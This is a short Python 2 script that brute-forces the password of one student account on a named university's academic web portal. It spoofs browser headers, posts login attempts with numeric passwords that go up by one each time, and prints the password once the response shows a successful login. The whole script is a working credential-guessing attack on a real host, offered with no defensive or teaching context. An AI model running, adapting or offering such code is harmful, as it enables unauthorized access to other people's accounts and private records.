import urllib, urllib2, cookielib, time

start_all = time.time()

posturl = 'http://jwpt.tjpu.edu.cn:8081/loginAction.do'   
passwd = 230000
name = 1111611310
headers = {'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0',  
           'Referer' : 'http://jwpt.tjpu.edu.cn:8081/logout.do'}
 
cj = cookielib.LWPCookieJar()  
cookie_support = urllib2.HTTPCookieProcessor(cj)  
opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)

urllib2.install_opener(opener)
           
def login(postData_temp): 
    #start1 = time.time()
    req = urllib2.Request(posturl, postData_temp, headers)
    resp = opener.open(req)  
    result = resp.read()
    
    print len(result)
    
    if '/menu/s_top.jsp' in result:
        flag_login = True
    else:
        flag_login = False

    #print 1, time.time() - start1

    return flag_login
    

while not login(urllib.urlencode({'zjh':name, 'mm':passwd})):
    print "%s is not right"%passwd
    passwd += 1;


print 'find it %s'%passwd
print "time_sum", time.time() - start_all
    
